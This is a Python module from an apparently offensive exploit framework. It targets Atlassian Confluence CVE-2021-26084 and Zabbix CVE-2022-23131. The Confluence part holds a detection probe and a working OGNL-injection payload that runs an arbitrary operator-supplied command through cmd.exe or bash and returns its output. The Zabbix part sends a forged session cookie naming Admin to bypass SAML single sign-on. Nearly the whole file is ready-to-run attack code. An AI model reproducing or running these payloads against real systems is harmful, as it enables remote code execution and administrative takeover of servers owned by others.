from util.ExpRequest import ExpRequest,Output
from bs4 import BeautifulSoup
import util.globalvar as GlobalVar
import prettytable as pt
import random
"""
from ClassCongregation import Dnslog
DL = Dnslog()
DL.dns_host()
DL.result()
"""
class CVE():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = env.get('timeout')
        self.retry_time = env.get('retry_time')
        self.retry_interval = env.get('retry_interval')
            
    def cve_2021_26084(self):
        appName = 'CVE'
        pocname = 'cve_2021_26084'
        paths = ['/pages/createpage-entervariables.action?SpaceKey=x', '/pages/createpage-entervariables.action', '/confluence/pages/createpage-entervariables.action?SpaceKey=x', '/confluence/pages/createpage-entervariables.action', '/wiki/pages/createpage-entervariables.action?SpaceKey=x', '/wiki/pages/createpage-entervariables.action', '/pages/doenterpagevariables.action', '/pages/createpage.action?spaceKey=myproj', '/pages/templates2/viewpagetemplate.action', '/pages/createpage-entervariables.action', '/template/custom/content-editor', '/templates/editor-preload-container', '/users/user-dark-features']
        method = 'get'
        desc = '[rce] app="ATLASSIAN-Confluence"'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        #条件
        num1 = random.randint(100, 10000)
        num2 = random.randint(100, 10000)
        sum = num1 * num2
        data = {"queryString": "aaaa\\u0027+{" + str(num1) + "*" + str(num2) + "}+\\u0027bbb"}
        #输出类
        output = Output(self.url, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                for path in paths:
                    try:
                        r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                        if str(sum) in r.text:
                            GlobalVar.set_value('cve_2021_26084_path', path)
                            return output.echo_success(method, desc)
                    except Exception:
                        continue
                return output.fail()
            else:
                path = GlobalVar.get_value('cve_2021_26084_path')
                data = {"queryString": "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022" + self.cmd + "\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027"}
                result = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                soup = BeautifulSoup(result, "lxml")
                content = soup.find('input', attrs={'name': 'queryString', 'type': 'hidden'})['value']
                print(content.replace('aaaaaaaa[', '').replace('\n]', ''))
        except Exception as error:
            return output.error_output(str(error))
        
    def cve_2022_23131(self):
        appName = 'CVE'
        pocname = 'cve_2022_23131'
        path = '/index_sso.php'
        method = 'get'
        data = ''
        desc = 'sso app="ZABBIX-监控系统" && body="saml"'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Cookie': 'zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiIiwic2lnbiI6IiJ9'}
        #输出类
        output = Output(self.url, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r.status_code == 302 and "action=dashboard.view" in r.headers['location']:
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))

tb = pt.PrettyTable()
tb.field_names = ['Target type', 'Vuln Name', 'Impact Version && Vulnerability description']
tb.align['Target type'] = 'l'
tb.align['Vuln Name'] = 'l'
tb.align['Impact Version && Vulnerability description'] = 'l'
tb.add_row([
    'CVE',
    'cve_2021_26084',
    '[rce] app="ATLASSIAN-Confluence" <6.13.23,6.14.0 - 7.4.11,7.5.0 - 7.11.6,7.12.0 - 7.12.5,<7.13.0'
])
tb.add_row([
    'CVE',
    'cve_2022_23131',
    '[sso] app="ZABBIX-监控系统" && body="saml" 5.4.0 - 5.4.8, 6.0.0alpha1'
])
print(tb)

def check(**kwargs):
    thread_list = []
    ExpCVE = CVE(**kwargs)
    #调用单个函数
    if kwargs['pocname'] != 'ALL':
        thread_list.append(kwargs['pool'].submit(getattr(ExpCVE, kwargs['pocname'])))
    #调用所有函数
    else:
        for func in dir(CVE):
            if not func.startswith("__"):
                thread_list.append(kwargs['pool'].submit(getattr(ExpCVE, func)))
    #保存全局子线程列表
    GlobalVar.add_value('thread_list', thread_list)





